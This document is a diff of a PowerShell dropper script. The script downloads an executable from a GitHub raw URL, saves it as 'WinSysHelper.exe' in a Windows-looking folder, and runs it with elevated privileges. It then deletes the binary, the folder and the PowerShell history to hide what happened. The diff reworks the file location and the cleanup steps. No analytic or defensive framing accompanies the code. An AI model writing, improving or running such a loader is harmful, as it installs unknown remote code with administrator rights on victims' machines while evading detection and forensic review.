@@ -1,16 +1,21 @@
-$ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
-
 $url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
-$output = "$env:TEMP\WinSysHelper.exe"
+
+$folder = "C:\ProgramData\WindowsTask"
+if (-not (Test-Path $folder)) { New-Item -Path $folder -ItemType Directory | Out-Null }
+$output = "$folder\WinSysHelper.exe"
 
 Invoke-WebRequest -Uri $url -OutFile $output
 
-Start-Process -FilePath $output -Verb RunAs
+$process = Start-Process -FilePath $output -Verb RunAs -PassThru
+$process | Wait-Process
 
-try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
-Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
+Start-Sleep -Seconds 2
+if (Test-Path $output) {
+    Remove-Item -Path $output -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path $folder -Recurse -Force -ErrorAction SilentlyContinue
+}
 
-Start-Process cmd -ArgumentList "/c timeout /t 10 && del /f /q `"$output`"" -WindowStyle Hidden
+Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 
 exit
